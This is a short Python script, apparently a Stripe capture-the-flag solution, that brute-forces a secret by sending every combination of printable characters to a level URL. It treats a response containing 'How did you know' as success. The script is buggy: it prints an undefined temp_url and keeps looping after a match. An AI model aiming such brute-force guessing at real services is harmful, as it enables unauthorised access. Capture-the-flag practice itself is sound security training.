import string
import requests, sys
import itertools
#from twisted.internet import reactor, defer, threads

#from bs4 import BeautifulSoup

def go(length=1):

    success = False


    while not success:
        for word in words(length):
            #temp_url = url + ''.join(word)
            if check(''.join(word)):
                success = True

        length += 1

    print temp_url


def words(length):
    full_list = itertools.product(string.printable, repeat=length)

    return full_list

def check(item):
    url = "https://level01-2.stripe-ctf.com/user-pahxnpdyyg/"
    r = requests.get(url, params={"attempt": item}, config={'verbose': sys.stderr}).text
    if "How did you know" in r:
        return True
    else:
        return False

if __name__ == "__main__":
    
    go(int(sys.argv[1]))
    
    #reactor.run()
